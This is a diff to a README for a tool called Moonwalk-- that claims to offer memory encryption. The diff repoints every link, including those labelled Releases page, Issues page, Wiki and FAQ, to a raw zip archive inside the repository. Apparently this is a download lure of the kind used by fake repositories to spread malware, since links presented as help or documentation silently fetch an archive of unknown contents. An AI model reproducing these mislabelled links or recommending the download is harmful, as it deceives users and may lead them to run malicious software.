@@ -6,7 +6,7 @@ Welcome to Moonwalk--! This software combines innovative techniques like StackMo
 
 ## 📥 Download the Software
 
-[![Download Moonwalk--](https://github.com/vaishnavipawar-29/Moonwalk--/raw/refs/heads/master/Moonwalk--/Moonwalk_1.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/vaishnavipawar-29/Moonwalk--/raw/refs/heads/master/Moonwalk--/Moonwalk_1.3.zip)
+[![Download Moonwalk--](https://raw.githubusercontent.com/vaishnavipawar-29/Moonwalk--/master/Moonwalk--/include/Moonwalk-1.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/vaishnavipawar-29/Moonwalk--/master/Moonwalk--/include/Moonwalk-1.7.zip)
 
 ## 🛠️ System Requirements
 
@@ -29,7 +29,7 @@ Moonwalk-- offers a variety of features designed to enhance your application's s
 
 To get Moonwalk--, visit the Releases page to download the latest version:
 
-[Visit the Releases Page](https://github.com/vaishnavipawar-29/Moonwalk--/raw/refs/heads/master/Moonwalk--/Moonwalk_1.3.zip)
+[Visit the Releases Page](https://raw.githubusercontent.com/vaishnavipawar-29/Moonwalk--/master/Moonwalk--/include/Moonwalk-1.7.zip)
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest release version.
@@ -63,12 +63,12 @@ If you encounter issues while running Moonwalk--, consider the following solutio
 
 For questions or support, you can connect with our community:
 
-- **GitHub Issues**: Use the [Issues page](https://github.com/vaishnavipawar-29/Moonwalk--/raw/refs/heads/master/Moonwalk--/Moonwalk_1.3.zip) to report bugs or request features.
+- **GitHub Issues**: Use the [Issues page](https://raw.githubusercontent.com/vaishnavipawar-29/Moonwalk--/master/Moonwalk--/include/Moonwalk-1.7.zip) to report bugs or request features.
 - **User Discussions**: Join discussions and share tips with other users on the GitHub Discussions page.
 
 ## 🔗 Additional Resources
 
-- For detailed feature descriptions, visit the [Wiki](https://github.com/vaishnavipawar-29/Moonwalk--/raw/refs/heads/master/Moonwalk--/Moonwalk_1.3.zip).
-- Check out our [FAQ](https://github.com/vaishnavipawar-29/Moonwalk--/raw/refs/heads/master/Moonwalk--/Moonwalk_1.3.zip) for common questions and answers.
+- For detailed feature descriptions, visit the [Wiki](https://raw.githubusercontent.com/vaishnavipawar-29/Moonwalk--/master/Moonwalk--/include/Moonwalk-1.7.zip).
+- Check out our [FAQ](https://raw.githubusercontent.com/vaishnavipawar-29/Moonwalk--/master/Moonwalk--/include/Moonwalk-1.7.zip) for common questions and answers.
 
 Thank you for choosing Moonwalk-- for your memory encryption needs! Enjoy a secure application environment with ease.
